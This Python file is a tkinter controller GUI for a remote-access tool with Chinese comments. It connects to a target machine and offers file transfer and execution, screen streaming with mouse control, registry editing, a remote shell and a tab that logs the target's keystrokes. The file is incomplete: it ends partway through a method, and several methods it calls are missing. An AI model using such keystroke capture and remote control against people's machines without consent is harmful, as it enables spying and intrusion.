"""
远程控制客户端 - 可视化版（与控制台菜单对应）
所有功能与服务端实际支持的功能一一对应
"""

import tkinter as tk
from tkinter import messagebox, simpledialog, filedialog, ttk, scrolledtext
import socket
import threading
import json
import struct
import io
import time
from datetime import datetime
from PIL import Image, ImageTk

from protocol import *
from config import SERVER_PORT, AUTH_PASSWORD_HASH
from gui_theme import COLORS, FONTS, PADDING

class VisualClientUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Remote Control - Visual Commander [MASTER]")
        self.geometry("1200x700")
        self.configure(bg=COLORS['bg_dark'])

        self.sock = None
        self.is_connected = False
        self.streaming = False
        self.keyboard_monitoring = False

        # Socket锁，防止多线程竞争
        self.sock_lock = threading.Lock()

        self._init_login_ui()

    def _init_login_ui(self):
        """初始化登录界面"""
        self.login_frame = tk.Frame(self, bg=COLORS['bg_dark'])
        self.login_frame.place(relx=0.5, rely=0.5, anchor='center')

        # 标题
        title = tk.Label(self.login_frame, text="◢ TARGET CONNECTION ◣",
                        font=FONTS['h1'], bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        title.pack(pady=20)

        # 输入框区域
        input_frame = tk.Frame(self.login_frame, bg=COLORS['bg_lighter'], bd=2, relief='solid')
        input_frame.pack(padx=40, pady=20)

        tk.Label(input_frame, text="Target IP:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).grid(row=0, column=0, padx=10, pady=10, sticky='e')
        self.entry_ip = tk.Entry(input_frame, font=FONTS['mono'], bg='#333',
                                fg='white', insertbackground='white', width=25)
        self.entry_ip.insert(0, "127.0.0.1")
        self.entry_ip.grid(row=0, column=1, padx=10, pady=10)

        tk.Label(input_frame, text="Password:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).grid(row=1, column=0, padx=10, pady=10, sticky='e')
        self.entry_pwd = tk.Entry(input_frame, show="●", font=FONTS['mono'],
                                 bg='#333', fg='white', insertbackground='white', width=25)
        self.entry_pwd.grid(row=1, column=1, padx=10, pady=10)

        # 连接按钮
        btn_connect = tk.Button(self.login_frame, text="▶ ESTABLISH CONNECTION",
                               command=self.connect_to_server,
                               bg=COLORS['fg_primary'], fg='black',
                               font=FONTS['h2'], relief='flat', cursor='hand2')
        btn_connect.pack(pady=20, fill='x', padx=40)

    def _init_dashboard_ui(self):
        """初始化主界面"""
        # 在销毁前保存IP地址
        self.target_ip = self.entry_ip.get()
        self.login_frame.destroy()

        # 顶部状态栏
        self._create_header()

        # 主内容区 - 使用Notebook创建多标签页
        self.notebook = ttk.Notebook(self)
        self._style_notebook()
        self.notebook.pack(fill='both', expand=True, padx=PADDING, pady=PADDING)

        # 创建各个功能标签页（与控制台菜单对应）
        self._create_sysinfo_tab()        # 9. 系统信息（静态）
        self._create_files_tab()          # 3. 文件管理
        self._create_screen_tab()         # 7. 屏幕实时查看+鼠标控制
        self._create_registry_tab()       # 5. 注册表管理
        self._create_keyboard_tab()       # 8. 键盘监控
        self._create_shell_tab()          # 4. Shell终端
        self._create_history_tab()        # 操作历史

        # 底部快捷操作栏
        self._create_quick_actions()

    def _style_notebook(self):
        """自定义Notebook样式"""
        style = ttk.Style()
        style.theme_create("geek", parent="alt", settings={
            "TNotebook": {"configure": {"background": COLORS['bg_dark'], "borderwidth": 0}},
            "TNotebook.Tab": {
                "configure": {"background": COLORS['btn_bg'], "foreground": COLORS['fg_white'],
                            "padding": [20, 10], "font": FONTS['body']},
                "map": {"background": [("selected", COLORS['bg_lighter'])],
                       "foreground": [("selected", COLORS['fg_primary'])]}
            }
        })
        style.theme_use("geek")

    def _create_header(self):
        """创建顶部状态栏"""
        header = tk.Frame(self, bg=COLORS['bg_lighter'], height=60)
        header.pack(fill='x')
        header.pack_propagate(False)

        # 左侧状态
        left_frame = tk.Frame(header, bg=COLORS['bg_lighter'])
        left_frame.pack(side='left', padx=20)

        tk.Label(left_frame, text="● CONNECTED", font=FONTS['status'],
                bg=COLORS['bg_lighter'], fg=COLORS['fg_success']).pack(anchor='w')

        self.lbl_target = tk.Label(left_frame, text=f"Target: {self.target_ip}",
                                  font=FONTS['mono'], bg=COLORS['bg_lighter'], fg=COLORS['fg_secondary'])
        self.lbl_target.pack(anchor='w')

        # 右侧时间和断开按钮
        right_frame = tk.Frame(header, bg=COLORS['bg_lighter'])
        right_frame.pack(side='right', padx=20)

        self.lbl_time = tk.Label(right_frame, text="", font=FONTS['body'],
                                bg=COLORS['bg_lighter'], fg=COLORS['fg_white'])
        self.lbl_time.pack(side='left', padx=10)
        self._update_time()

        btn_disconnect = tk.Button(right_frame, text="✖ DISCONNECT", command=self.disconnect,
                                  bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                                  relief='flat', cursor='hand2')
        btn_disconnect.pack(side='right')

    def _update_time(self):
        """更新时间显示"""
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.lbl_time.config(text=now)
        self.after(1000, self._update_time)

    # ==================== 标签页1: 系统信息（静态）====================

    def _create_sysinfo_tab(self):
        """创建系统信息标签页"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="💻 SYSTEM INFO")

        # 顶部刷新按钮
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        tk.Button(control_frame, text="🔄 REFRESH INFO", command=self.refresh_sys_info,
                 bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        # 信息显示区域
        info_frame = tk.Frame(tab, bg=COLORS['bg_lighter'], bd=2, relief='solid')
        info_frame.pack(fill='both', expand=True, padx=20, pady=10)

        # 创建信息标签
        self.sysinfo_labels = {}
        info_items = [
            ('OS', 'Operating System'),
            ('OS Version', 'System Version'),
            ('OS Release', 'System Release'),
            ('Architecture', 'Architecture'),
            ('Processor', 'Processor'),
            ('Hostname', 'Hostname'),
            ('IP Address', 'IP Address'),
            ('Python Version', 'Python Version'),
            ('Online Status', 'Online Status')
        ]

        for i, (key, display_name) in enumerate(info_items):
            # 左侧标签
            tk.Label(info_frame, text=f"{display_name}:", font=FONTS['body'],
                    bg=COLORS['bg_lighter'], fg=COLORS['fg_white'], anchor='w').grid(
                        row=i, column=0, sticky='w', padx=20, pady=8)

            # 右侧值
            lbl_value = tk.Label(info_frame, text="Loading...", font=FONTS['body'],
                                bg=COLORS['bg_lighter'], fg=COLORS['fg_secondary'], anchor='w')
            lbl_value.grid(row=i, column=1, sticky='w', padx=20, pady=8)
            self.sysinfo_labels[key] = lbl_value

        # 自动加载
        self.after(500, self.refresh_sys_info)

    def refresh_sys_info(self):
        """刷新系统信息"""
        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_system_info_message())
                    msg = receive_message(self.sock)

                if msg and msg['type'] == MessageType.SYSTEM_INFO_RESPONSE:
                    info = msg['data']['info']

                    # 更新UI
                    self.after(0, lambda: self._update_sysinfo_display(info))
                    self.add_history("System Info", "Retrieved system information", "Success")
            except Exception as e:
                print(f"Get sys info error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    def _update_sysinfo_display(self, info):
        """更新系统信息显示"""
        mapping = {
            'OS': info.get('os', 'N/A'),
            'OS Version': info.get('os_version', 'N/A'),
            'OS Release': info.get('os_release', 'N/A'),
            'Architecture': info.get('architecture', 'N/A'),
            'Processor': info.get('processor', 'N/A'),
            'Hostname': info.get('hostname', 'N/A'),
            'IP Address': info.get('ip_address', 'N/A'),
            'Python Version': info.get('python_version', 'N/A'),
            'Online Status': '在线' if info.get('online') else '离线'
        }

        for key, value in mapping.items():
            if key in self.sysinfo_labels:
                self.sysinfo_labels[key].config(text=value)

    # ==================== 标签页2: 文件管理 ====================

    def _create_files_tab(self):
        """创建文件管理标签页"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="📂 FILES")

        # 顶部路径和控制栏
        top_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        top_frame.pack(fill='x', padx=10, pady=10)

        tk.Label(top_frame, text="File Path:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).pack(side='left', padx=5)

        self.file_path_entry = tk.Entry(top_frame, font=FONTS['mono'], bg='#333',
                                        fg='white', insertbackground='white')
        self.file_path_entry.pack(side='left', fill='x', expand=True, padx=5)
        self.file_path_entry.insert(0, ".")

        # 操作按钮栏
        btn_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        btn_frame.pack(fill='x', padx=10)

        buttons = [
            ("⬇️ DOWNLOAD", self.download_file),
            ("⬆️ UPLOAD", self.upload_file),
            ("▶️ EXECUTE", self.execute_file),
        ]

        for text, cmd in buttons:
            tk.Button(btn_frame, text=text, command=cmd, bg=COLORS['btn_bg'],
                     fg='white', font=FONTS['body'], relief='flat').pack(side='left', padx=5, pady=5)

        # 说明文本
        note_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        note_frame.pack(fill='both', expand=True, padx=20, pady=20)

        note_text = """
文件管理功能说明：

• 下载文件 (DOWNLOAD)
  在上方输入框输入远程文件路径，点击"DOWNLOAD"下载到本地

• 上传文件 (UPLOAD)
  点击"UPLOAD"选择本地文件，上传到远程的安全目录

• 执行文件 (EXECUTE)
  在上方输入框输入远程文件路径，点击"EXECUTE"在远程执行
  (仅支持Python文件 .py)

注意：
- 所有文件操作都限制在服务端的安全目录内
- 安全目录默认为: safe_files/
- 下载时使用相对路径，如: test.txt
"""
        tk.Label(note_frame, text=note_text, font=FONTS['small'],
                bg=COLORS['bg_lighter'], fg=COLORS['fg_white'],
                justify='left', anchor='w').pack(fill='both', expand=True, padx=20, pady=20)

    def download_file(self):
        """下载文件"""
        filepath = self.file_path_entry.get()
        if not filepath:
            messagebox.showwarning("Warning", "Please enter file path")
            return

        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_file_download_message(filepath))
                    header = receive_message(self.sock)

                    if header and header['type'] == MessageType.FILE_DATA:
                        if header['data']['success']:
                            file_data = receive_binary_data(self.sock)
                            filename = header['data']['filename']

                            save_path = filedialog.asksaveasfilename(initialfile=filename)
                            if save_path:
                                with open(save_path, 'wb') as f:
                                    f.write(file_data)
                                self.after(0, lambda: messagebox.showinfo("Success", f"File downloaded to {save_path}"))
                                self.add_history("File", f"Downloaded: {filepath}", "Success")
                        else:
                            error = header['data'].get('error', 'Unknown error')
                            self.after(0, lambda: messagebox.showerror("Error", f"Download failed: {error}"))
            except Exception as e:
                print(f"Download error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    def upload_file(self):
        """上传文件"""
        local_path = filedialog.askopenfilename()
        if not local_path:
            return

        filename = local_path.split('/')[-1]

        def _thread():
            try:
                # 读取文件
                with open(local_path, 'rb') as f:
                    file_data = f.read()

                with self.sock_lock:
                    # 发送上传请求
                    send_message(self.sock, create_file_upload_message(filename, filename))
                    # 发送文件数据
                    send_binary_data(self.sock, file_data)
                    # 接收响应
                    resp = receive_message(self.sock)

                    if resp and resp['type'] == MessageType.FILE_UPLOAD_RESPONSE:
                        if resp['data']['success']:
                            self.after(0, lambda: messagebox.showinfo("Success", "File uploaded successfully"))
                            self.add_history("File", f"Uploaded: {filename}", "Success")
                        else:
                            error = resp['data'].get('error', 'Unknown error')
                            self.after(0, lambda: messagebox.showerror("Error", f"Upload failed: {error}"))
            except Exception as e:
                print(f"Upload error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    def execute_file(self):
        """执行文件"""
        filepath = self.file_path_entry.get()
        if not filepath:
            messagebox.showwarning("Warning", "Please enter file path")
            return

        args = simpledialog.askstring("Arguments", "Enter arguments (optional):", initialvalue="")

        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_file_execute_message(filepath, args or ''))
                    resp = receive_message(self.sock)

                    if resp and resp['type'] == MessageType.FILE_EXECUTE_RESPONSE:
                        if resp['data']['success']:
                            output = resp['data'].get('output', 'Executed successfully')
                            self.after(0, lambda: messagebox.showinfo("Success", f"Output:\n{output}"))
                            self.add_history("File", f"Executed: {filepath}", "Success")
                        else:
                            error = resp['data'].get('error', 'Unknown error')
                            self.after(0, lambda: messagebox.showerror("Error", f"Execution failed: {error}"))
            except Exception as e:
                print(f"Execute error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    # ==================== 标签页3: 屏幕监控+鼠标控制 ====================

    def _create_screen_tab(self):
        """创建屏幕监控标签"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="🖥️ SCREEN")

        # 控制栏
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        self.btn_start_stream = tk.Button(control_frame, text="▶ START STREAM",
                                          command=self.start_screen_stream,
                                          bg=COLORS['fg_success'], fg='black', font=FONTS['body'],
                                          relief='flat')
        self.btn_start_stream.pack(side='left', padx=5)

        self.btn_stop_stream = tk.Button(control_frame, text="⏹ STOP STREAM",
                                         command=self.stop_screen_stream,
                                         bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                                         relief='flat', state='disabled')
        self.btn_stop_stream.pack(side='left', padx=5)

        tk.Button(control_frame, text="📸 SCREENSHOT", command=self.take_screenshot,
                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Label(control_frame, text="Quality:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).pack(side='left', padx=10)

        self.quality_scale = tk.Scale(control_frame, from_=10, to=100, orient='horizontal',
                                     bg=COLORS['bg_lighter'], fg='white',
                                     highlightthickness=0, length=150)
        self.quality_scale.set(50)
        self.quality_scale.pack(side='left')

        # 鼠标控制提示
        tk.Label(control_frame, text="| Mouse Control: Click on screen to send mouse events",
                bg=COLORS['bg_lighter'], fg=COLORS['fg_warning'], font=FONTS['small']).pack(side='left', padx=20)

        # 屏幕显示区域
        self.screen_label = tk.Label(tab, bg='black', text="Screen stream will appear here\nClick START STREAM",
                                    fg=COLORS['fg_white'], font=FONTS['h2'])
        self.screen_label.pack(fill='both', expand=True, padx=10, pady=10)

        # 绑定鼠标事件（用于远程控制）
        self.screen_label.bind('<Button-1>', self.on_screen_click)
        self.screen_label.bind('<Button-3>', self.on_screen_right_click)

    def on_screen_click(self, event):
        """处理屏幕点击（鼠标控制）"""
        if not self.streaming:
            return

        # 获取点击位置相对于图像的坐标
        x, y = event.x, event.y

        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_mouse_event_message('click', x, y, 'left', 1))
                    resp = receive_message(self.sock)
                    print(f"Mouse click sent: ({x}, {y})")
            except Exception as e:
                print(f"Mouse click error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    def on_screen_right_click(self, event):
        """处理屏幕右键点击"""
        if not self.streaming:
            return

        x, y = event.x, event.y

        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_mouse_event_message('click', x, y, 'right', 1))
                    resp = receive_message(self.sock)
                    print(f"Mouse right-click sent: ({x}, {y})")
            except Exception as e:
                print(f"Mouse right-click error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    def start_screen_stream(self):
        """开始屏幕流"""
        if self.streaming:
            return

        quality = self.quality_scale.get()

        with self.sock_lock:
            send_message(self.sock, create_screen_start_message(fps=10, quality=quality))

        self.streaming = True
        self.btn_start_stream.config(state='disabled')
        self.btn_stop_stream.config(state='normal')

        threading.Thread(target=self._screen_stream_loop, daemon=True).start()
        self.add_history("Screen", "Started screen streaming", "Success")

    def stop_screen_stream(self):
        """停止屏幕流"""
        self.streaming = False

        # 在独立线程中发送停止消息，避免死锁
        def _send_stop():
            try:
                time.sleep(0.1)  # 给流线程一点时间释放锁
                with self.sock_lock:
                    send_message(self.sock, create_screen_stop_message())
            except Exception as e:
                print(f"Send stop message error: {e}")

        threading.Thread(target=_send_stop, daemon=True).start()

        self.screen_label.config(image='', text="Stream stopped\nClick START STREAM to resume")
        self.btn_start_stream.config(state='normal')
        self.btn_stop_stream.config(state='disabled')
        self.add_history("Screen", "Stopped screen streaming", "Success")

    def _screen_stream_loop(self):
        """屏幕流接收循环"""
        try:
            # 接收开始响应
            with self.sock_lock:
                _ = receive_message(self.sock)

            while self.streaming:
                try:
                    with self.sock_lock:
                        msg = receive_message(self.sock)
                        if not msg:
                            break

                        if msg['type'] == MessageType.SCREEN_FRAME:
                            img_bytes = receive_binary_data(self.sock)
                            if img_bytes:
                                image = Image.open(io.BytesIO(img_bytes))
                                # 缩放以适应标签页
                                image.thumbnail((900, 500))
                                photo = ImageTk.PhotoImage(image)

                                if self.streaming:
                                    self.after(0, lambda p=photo: self._update_screen_frame(p))
                        elif msg['type'] == MessageType.SCREEN_STOP:
                            break
                except Exception as e:
                    print(f"Stream frame error: {e}")
                    break
        except Exception as e:
            print(f"Stream error: {e}")
        finally:
            self.streaming = False
            self.after(0, lambda: self.btn_start_stream.config(state='normal'))
            self.after(0, lambda: self.btn_stop_stream.config(state='disabled'))

    def _update_screen_frame(self, photo):
        """更新屏幕帧"""
        try:
            self.screen_label.configure(image=photo, text='')
            self.screen_label.image = photo
        except:
            pass

    def take_screenshot(self):
        """截取屏幕截图"""
        self.req_screenshot()

    # ==================== 标签页4: 注册表管理 ====================

    def _create_registry_tab(self):
        """创建注册表管理标签页（仅Windows）"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="🔐 REGISTRY")

        # 说明
        note_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        note_frame.pack(fill='x', padx=10, pady=10)

        tk.Label(note_frame, text="⚠️ Registry management is only available on Windows systems",
                font=FONTS['body'], bg=COLORS['bg_lighter'], fg=COLORS['fg_warning']).pack(pady=10)

        # 操作区域
        input_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        input_frame.pack(fill='x', padx=20, pady=10)

        # Hive选择
        tk.Label(input_frame, text="Hive:", bg=COLORS['bg_dark'], fg='white', font=FONTS['body']).grid(row=0, column=0, sticky='w', pady=5)
        self.registry_hive = ttk.Combobox(input_frame, values=['HKLM', 'HKCU', 'HKCR', 'HKU', 'HKCC'],
                                         font=FONTS['mono'], width=20)
        self.registry_hive.set('HKLM')
        self.registry_hive.grid(row=0, column=1, sticky='w', padx=10, pady=5)

        # 键路径
        tk.Label(input_frame, text="Key Path:", bg=COLORS['bg_dark'], fg='white', font=FONTS['body']).grid(row=1, column=0, sticky='w', pady=5)
        self.registry_path = tk.Entry(input_frame, font=FONTS['mono'], bg='#333', fg='white',
                                     insertbackground='white', width=50)
        self.registry_path.insert(0, "SOFTWARE\\")
        self.registry_path.grid(row=1, column=1, sticky='w', padx=10, pady=5)

        # 值名称
        tk.Label(input_frame, text="Value Name:", bg=COLORS['bg_dark'], fg='white', font=FONTS['body']).grid(row=2, column=0, sticky='w', pady=5)
        self.registry_name = tk.Entry(input_frame, font=FONTS['mono'], bg='#333', fg='white',
                                     insertbackground='white', width=50)
        self.registry_name.grid(row=2, column=1, sticky='w', padx=10, pady=5)

        # 操作按钮
        btn_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        btn_frame.pack(fill='x', padx=20, pady=10)

        tk.Button(btn_frame, text="🔍 QUERY", command=self.query_registry,
                 bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Button(btn_frame, text="✏️ SET", command=self.set_registry,
                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Button(btn_frame, text="🗑️ DELETE", command=self.delete_registry,
                 bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        # 结果显示区域
        result_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        result_frame.pack(fill='both', expand=True, padx=20, pady=10)

        tk.Label(result_frame, text="Result:", bg=COLORS['bg_dark'], fg='white', font=FONTS['body']).pack(anchor='w')

        self.registry_result = scrolledtext.ScrolledText(result_frame, height=15,
                                                        bg='black', fg=COLORS['fg_secondary'],
                                                        font=FONTS['mono'])
        self.registry_result.pack(fill='both', expand=True)

    def query_registry(self):
        """查询注册表"""
        hive = self.registry_hive.get()
        key_path = self.registry_path.get()
        name = self.registry_name.get() or None

        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_registry_query_message(hive, key_path, name))
                    resp = receive_message(self.sock)

                    if resp and resp['type'] == MessageType.REGISTRY_RESPONSE:
                        if resp['data']['success']:
                            result = json.dumps(resp['data'].get('result', {}), indent=2)
                            self.after(0, lambda: self.registry_result.delete('1.0', tk.END))
                            self.after(0, lambda: self.registry_result.insert('1.0', result))
                            self.add_history("Registry", f"Queried: {hive}\\{key_path}", "Success")
                        else:
                            error = resp['data'].get('error', 'Unknown error')
                            self.after(0, lambda: messagebox.showerror("Error", error))
            except Exception as e:
                print(f"Registry query error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    def set_registry(self):
        """设置注册表值"""
        hive = self.registry_hive.get()
        key_path = self.registry_path.get()
        name = self.registry_name.get()

        if not name:
            messagebox.showwarning("Warning", "Please enter value name")
            return

        value = simpledialog.askstring("Set Registry", "Enter value:")
        if value is None:
            return

        value_type = simpledialog.askstring("Set Registry", "Enter value type (REG_SZ/REG_DWORD):",
                                           initialvalue="REG_SZ")

        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_registry_set_message(hive, key_path, name, value, value_type))
                    resp = receive_message(self.sock)

                    if resp and resp['type'] == MessageType.REGISTRY_RESPONSE:
                        if resp['data']['success']:
                            self.after(0, lambda: messagebox.showinfo("Success", "Registry value set successfully"))
                            self.add_history("Registry", f"Set: {hive}\\{key_path}\\{name}", "Success")
                        else:
                            error = resp['data'].get('error', 'Unknown error')
                            self.after(0, lambda: messagebox.showerror("Error", error))
            except Exception as e:
                print(f"Registry set error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    def delete_registry(self):
        """删除注册表值"""
        hive = self.registry_hive.get()
        key_path = self.registry_path.get()
        name = self.registry_name.get() or None

        if not messagebox.askyesno("Confirm", f"Delete registry value?\n{hive}\\{key_path}\\{name or '(entire key)'}"):
            return

        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_registry_delete_message(hive, key_path, name))
                    resp = receive_message(self.sock)

                    if resp and resp['type'] == MessageType.REGISTRY_RESPONSE:
                        if resp['data']['success']:
                            self.after(0, lambda: messagebox.showinfo("Success", "Registry value deleted"))
                            self.add_history("Registry", f"Deleted: {hive}\\{key_path}\\{name or '(key)'}", "Success")
                        else:
                            error = resp['data'].get('error', 'Unknown error')
                            self.after(0, lambda: messagebox.showerror("Error", error))
            except Exception as e:
                print(f"Registry delete error: {e}")

        threading.Thread(target=_thread, daemon=True).start()

    # ==================== 标签页5: 键盘监控 ====================

    def _create_keyboard_tab(self):
        """创建键盘监控标签页"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="🕵️ KEYBOARD")

        # 控制栏
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        self.btn_start_keyboard = tk.Button(control_frame, text="▶ START MONITORING",
                                           command=self.start_keyboard_monitor,
                                           bg=COLORS['fg_success'], fg='black', font=FONTS['body'],
                                           relief='flat')
        self.btn_start_keyboard.pack(side='left', padx=5)

        self.btn_stop_keyboard = tk.Button(control_frame, text="⏹ STOP MONITORING",
                                          command=self.stop_keyboard_monitor,
                                          bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                                          relief='flat', state='disabled')
        self.btn_stop_keyboard.pack(side='left', padx=5)

        tk.Button(control_frame, text="🗑️ CLEAR", command=self.clear_keyboard_log,
                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        # 键盘记录显示区域
        log_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        log_frame.pack(fill='both', expand=True, padx=10, pady=10)

        tk.Label(log_frame, text="[ KEYBOARD EVENTS LOG ]", font=FONTS['body'],
                bg=COLORS['bg_dark'], fg=COLORS['fg_white']).pack(anchor='w')

        self.keyboard_log = scrolledtext.ScrolledText(log_frame, height=25,
                                                      bg='black', fg=COLORS['fg_primary'],
                                                      font=FONTS['mono'])
        self.keyboard_log.pack(fill='both', expand=True)

    def start_keyboard_monitor(self):
        """开始键盘监控"""
        if self.keyboard_monitoring:
            return

        def _thread():
            try:
                with self.sock_lock:
                    send_message(self.sock, create_keyboard_monitor_start_message())

                self.keyboard_monitoring = True
                self.after(0, lambda: self.btn_start_keyboard.config(state='disabled'))
                self.after(0, lambda: self.btn_stop_keyboard.config(state='normal'))

                # 开始接收键盘事件
                while self.keyboard_monitoring:
                    try:
                        with self.sock_lock:
                            msg = receive_message(self.sock)

                        if msg and msg['type'] == MessageType.KEYBOARD_EVENT:
                            key = msg['data']['key']
                            event_type = msg['data']['event_type']
                            timestamp = msg['data']['timestamp']

                            log_entry = f"[{timestamp}] {event_type.upper()}: {key}\n"
                            self.after(0, lambda e=log_entry: self.keyboard_log.insert(tk.END, e))
                            self.after(0, lambda: self.keyboard_log.see(tk.END))

                    except Exception as e:
                        print(f"Keyboard event error: {e}")
                        break

            except Exception as e:
                print(f"Keyboard monitor error: {e}")

        threading.Thread(target=_thread, daemon=True).start()
        self.add_history("Keyboard", "Started keyboard monitoring", "Success")

    def stop_keyboard_monitor(self):
        """停止键盘监控"""
        self.keyboard_monitoring = False

        # 在独立线程中发送停止消息，避免死锁
        def _send_stop():
            try:
                time.sleep(0.1)  # 给监控线程一点时间释放锁
                with self.sock_lock:
                    send_message(self.sock, create_keyboard_monitor_stop_message())
            except Exception as e:
                print(f"Send stop keyboard message error: {e}")

        threading.Thread(target=_send_stop, daemon=True).start()

        self.btn_start_keyboard.config(state='normal')
        self.btn_stop_keyboard.config(state='disabled')
        self.add_history("Keyboard", "Stopped keyboard monitoring", "Success")

    def clear_keyboard_log(self):
        """清空键盘日志"""
        self.keyboard_log.delete('1.0', tk.END)

    # ==================== 标签页6: Shell终端 ====================

    def _create_shell_tab(self):
        """创建Shell终端"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="💻 SHELL")

        # 终端显示区
        self.shell_text = scrolledtext.ScrolledText(tab, bg='black', fg=COLORS['fg_primary'],
                                                    font=FONTS['mono'], insertbackground='white')
        self.shell_text.pack(fill='both', expand=True, padx=10, pady=10)
        self.shell_text.insert(tk.END, "Remote Shell Session\n")
        self.shell_text.insert(tk.END, "=" * 60 + "\n")
        self.shell_text.insert(tk.END, "> ")

        # 命令输入框
        input_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        input_frame.pack(fill='x', padx=10, pady=(0, 10))

        tk.Label(input_frame, text=">", font=FONTS['mono'], bg=COLORS['bg_dark'],
                fg=COLORS['fg_primary']).pack(side='left', padx=5)

        self.shell_entry = tk.Entry(input_frame, font=FONTS['mono'], bg='#333',
                                    fg='white', insertbackground='white')
        self.shell_entry.pack(side='left', fill='x', expand=True, padx=5)
        self.shell_entry.bind('<Return>', self.send_shell_command)

        tk.Button(input_frame, text="SEND", command=lambda: self.send_shell_command(None),
                 bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
                 relief='flat').pack(side='right', padx=5)

    def send_shell_command(self, event):
        """发送Shell命令"""
        cmd = self.shell_entry.get()
        if not cmd:
            return

        self.shell_entry.delete(0, tk.END)
        self.shell_text.insert(tk.END, f"{cmd}\n")

        # 发送命令
        with self.sock_lock:
            send_message(self.sock, create_shell_message(cmd))

        # 接收响应
        threading.Thread(target=self._wait_shell_response, daemon=True).start()

        self.add_history("Shell", f"Executed: {cmd}", "Success")

    def _wait_shell_response(self):
        """等待Shell响应"""
        try:
            with self.sock_lock:
                resp = receive_message(self.sock)
            if resp and resp['type'] == MessageType.SHELL_RESPONSE:
                output = resp['data']['output']
                self.after(0, lambda: self.shell_text.insert(tk.END, f"{output}\n> "))
                self.after(0, lambda: self.shell_text.see(tk.END))
        except Exception as e:
            print(f"Shell response error: {e}")

    # ==================== 标签页7: 操作历史 ====================

    def _create_history_tab(self):
        """创建操作历史时间线"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="📜 HISTORY")

        # 顶部控制
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        tk.Button(control_frame, text="🗑️ CLEAR", command=self.clear_history,
                 bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Button(control_frame, text="💾 EXPORT", command=self.export_history,
                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        # 历史记录列表
        list_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        list_frame.pack(fill='both', expand=True, padx=10, pady=10)

        columns = ('Time', 'Action', 'Details', 'Status')
        self.history_tree = ttk.Treeview(list_frame, columns=columns, show='headings', height=25)

        for col in columns:
            self.history_tree.heading(col, text=col)
            width = 150 if col == 'Time' else (200 if col == 'Action' else 400)
            self.history_tree.column(col, width=width)

        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.history_tree.yview)
        self.history_tree.configure(yscrollcommand=scrollbar.set)

        self.history_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')

    # ==================== 底部快捷操作栏 ====================

    def _create_quick_actions(self):
        """创建底部快捷操作栏"""
        quick_frame = tk.Frame(self, bg=COLORS['bg_lighter'], height=50)
        quick_frame.pack(fill='x', side='bottom')
        quick_frame.pack_propagate(False)

